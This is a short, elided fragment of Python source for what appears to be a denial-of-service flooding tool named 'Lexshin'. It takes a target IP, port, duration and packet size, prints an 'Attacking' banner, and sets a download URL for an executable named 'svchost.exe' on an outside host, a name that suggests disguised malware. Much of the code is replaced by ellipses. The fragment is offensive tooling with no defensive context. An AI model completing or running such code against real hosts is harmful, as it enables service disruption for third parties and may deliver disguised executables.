...
url = 'https://dropctf.live/file/svchost.exe'
...
def attack(ip, port, time, size):
    ...
    fmt = '[XUiF]Attacking {ip} on {port} for {time} with a size of {size} bytes.'.format(
        ip=ip,
...
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Usage: python Lexshin <ip> <port> <time> <size>')
